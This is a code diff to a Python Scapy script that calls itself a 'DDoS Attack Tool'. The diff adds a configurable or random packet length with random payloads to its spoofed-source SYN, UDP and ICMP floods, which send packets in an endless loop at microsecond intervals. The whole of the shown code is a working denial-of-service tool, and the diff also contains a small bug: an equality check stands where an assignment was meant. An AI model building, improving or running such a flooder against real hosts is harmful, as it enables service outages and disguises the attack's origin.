@@ -13,6 +13,9 @@ is_random_src_port = False
 global is_random_dst_port
 is_random_dst_port = False
 
+global is_random_pkt_len
+is_random_pkt_len = False
+
 global source_port
 source_port = -1
 
@@ -103,7 +106,7 @@ def set_source_port(is_random_src_port):
 # Set destination port
 def set_destination_port(is_random_dst_port):
    while True:      
-      dst_port = input("Enter Destination Port Number:")
+      dst_port = input("Enter Destination Port Number: ")
       if dst_port == "":
          print("-->Set random port")
          dst_port = -1
@@ -114,6 +117,28 @@ def set_destination_port(is_random_dst_port):
          break
 
    return int(dst_port), is_random_dst_port
+
+# Set packet length
+def set_pkt_len(is_random_pkt_len):
+   pkt_len = 0
+   while True:
+      pkt_len = input("Enter Packet Length: ")
+      if pkt_len == "":
+         print("--> Set random length")
+         pkt_len == -1
+         is_random_pkt_len = True
+         break
+
+      if pkt_len.isdigit() is not True or int(pkt_len) < 0 or int(pkt_len) > 65535:
+         print("Packet length is not valid!")
+         continue
+
+      else:
+         print("--> Packet length: {}".format(pkt_len))
+         is_random_pkt_len = False
+         break
+
+   return pkt_len, is_random_pkt_len
 
 i = 1
 
@@ -133,7 +158,7 @@ def rand_port():
 
    return rport
 
-def send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port):
+def send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len):
    if ip_proto != 0:
       if is_random_src_port == True:
          source_port = rand_port()
@@ -141,27 +166,30 @@ def send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port
       if is_random_dst_port == True:
          destination_port = rand_port()
 
+      if (is_random_pkt_len == True):
+         pkt_len = random.randint(0, 65534)
+
       if ip_proto == 1:
          TCP1 = TCP(sport = source_port, dport = destination_port, flags = 'S')
-         pkt = IP1 / TCP1
+         pkt = IP1 / TCP1 / Raw(RandString(size = int(pkt_len)))
          send(pkt, inter = .000001)
          return
 
       if ip_proto == 2:
          UDP1 = UDP(sport = source_port, dport = destination_port)
-         pkt = IP1 / UDP1
+         pkt = IP1 / UDP1 / Raw(RandString(size = int(pkt_len)))
          send(pkt, inter = .000001)
          return
    else:
       pkt = IP1 / ICMP()
-      send(pkt, inter = .00001)
+      send(pkt, inter = .000001)
       return
 
 print("----------------------------------------------------------------")
 print("----------------------------------------------------------------")
 print("----------------------------------------------------------------")
 print("-------------------Welcome to DDoS Attack Tool------------------")
-print("------------------------Written by TuanNQ-----------------------")
+print("----------------------Written by TuanNQ-VCS---------------------")
 print("----------------------------------------------------------------")
 print("----------------------------------------------------------------")
 print("----------------------------------------------------------------")
@@ -205,6 +233,8 @@ if (ip_proto != 0):
    source_port, is_random_src_port = set_source_port(is_random_src_port)
    # global destination_port
    destination_port, is_random_dst_port = set_destination_port(is_random_dst_port)
+
+pkt_len, is_random_pkt_len = set_pkt_len(is_random_pkt_len)
 
 print("\t############Summary############")
 if spoof_ip == 1:
@@ -257,10 +287,10 @@ while True:
       if is_random_ip == True:
          source_ip = rand_ip()
       IP1 = IP(src = source_ip, dst = target_ip)
-      send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port)
+      send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
    else:
       IP1 = IP(dst = target_ip)
-      send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port)
+      send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
 
    # global pkt
    # pkt = IP1 / ICMP()
